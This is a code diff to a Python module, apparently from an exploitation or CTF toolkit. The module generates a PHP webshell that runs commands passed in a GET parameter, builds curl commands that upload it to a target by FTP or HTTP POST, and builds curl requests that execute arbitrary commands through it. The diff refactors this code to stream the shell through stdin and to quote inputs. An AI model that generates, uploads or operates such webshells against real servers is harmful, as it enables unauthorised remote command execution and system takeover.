@@ -1,6 +1,8 @@
 """
 PHP webshell and curl utilities for web exploitation
 """
+import shlex
+from urllib.parse import quote_plus
 
 
 def generate_php_webshell(target_url=None, port=None,
@@ -17,22 +19,28 @@ def generate_php_webshell(target_url=None, port=None,
     Returns:
         Tuple of (webshell content, upload command)
     """
-    with open('shell.php', 'w', encoding='utf-8') as f:
-        f.write("""<?php system($_GET['cmd']); ?>""")
     webshell = """<?php system($_GET['cmd']); ?>"""
 
+    # Always return a tuple: (webshell_content, upload_command_or_None)
+    upload_cmd = None
+
     if not target_url:
-        return webshell
+        return webshell, upload_cmd
 
     if not port:
         port = 21 if protocol == "ftp" else 80
 
+    # Build upload command that reads the shell from stdin so we don't
+    # create files on disk as a side-effect. Use shlex.quote to safely
+    # embed the literal webshell in a shell-safe printf invocation.
+    quoted = shlex.quote(webshell)
     if protocol == "ftp":
-        upload_cmd = f"curl -T shell.php ftp://{target_url}:{port}/"
+        upload_cmd = f"printf %s {quoted} | curl -T - ftp://{target_url}:{port}/shell.php"
     else:
-        # HTTP POST upload
-        upload_cmd = f"curl -X POST http://{
-            target_url}:{port} -F 'file=@shell.php'"
+        upload_cmd = (
+            f"printf %s {quoted} | curl -X POST http://{target_url}:{port} "
+            f"-F 'file=@-;filename=shell.php'"
+        )
 
     return webshell, upload_cmd
 
@@ -49,7 +57,7 @@ def curl_webshell(url, command, cmd_param="cmd"):
     Returns:
         Command to execute with curl
     """
-    encoded_cmd = command.replace(" ", "+")
+    encoded_cmd = quote_plus(command)
     return f"curl '{url}?{cmd_param}={encoded_cmd}'"
 
 
@@ -65,6 +73,9 @@ def upload_webshell(url, filename="shell.php", ctf=None):  # pylint: disable=unu
     Returns:
         Tuple of (webshell content, curl upload command)
     """
-    shell = generate_php_webshell()
-    curl_cmd = f"""curl -X POST {url} -F "file=@{filename}" """
+    shell, _ = generate_php_webshell()
+    quoted = shlex.quote(shell)
+    curl_cmd = (
+        f"printf %s {quoted} | curl -X POST {url} -F 'file=@-;filename={filename}'"
+    )
     return shell, curl_cmd
